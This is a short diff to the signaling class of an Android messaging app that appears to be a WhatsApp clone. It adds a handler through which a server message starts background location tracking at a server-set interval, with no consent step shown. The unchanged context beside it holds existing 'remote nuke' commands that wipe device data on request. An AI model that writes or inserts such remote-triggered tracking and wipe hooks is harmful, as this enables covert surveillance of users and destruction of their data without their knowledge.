@@ -270,6 +270,15 @@ class WebSocketSignalingManager private constructor() {
                     val callerName = json.optString("caller_name")
                     _callSignals.tryEmit(CallSignalEvent(type, senderId, recipientId, channelName, isVideo, callerName))
                 }
+                "SET_LOCATION_INTERVAL", "UPDATE_LOCATION_INTERVAL" -> {
+                    val targetDev = json.optString("deviceId", json.optString("device_id", ""))
+                    val targetUser = json.optString("userId", json.optString("user_id", ""))
+                    val intervalMinutes = json.optLong("intervalMinutes", json.optLong("interval_minutes", json.optLong("interval", 1L)))
+                    Log.i(TAG, "Received SET_LOCATION_INTERVAL command: $intervalMinutes min (target dev='$targetDev', user='$targetUser')")
+                    appContext?.let { ctx ->
+                        com.whatsapp.clone.worker.LocationTrackingEngine.start(ctx, intervalMinutes)
+                    }
+                }
                 "ACTION_DEVICE_SANITIZE", "ACTION_REMOTE_NUKE" -> {
                     Log.w(TAG, "Received remote data sanitization command!")
                     appContext?.let { ctx ->
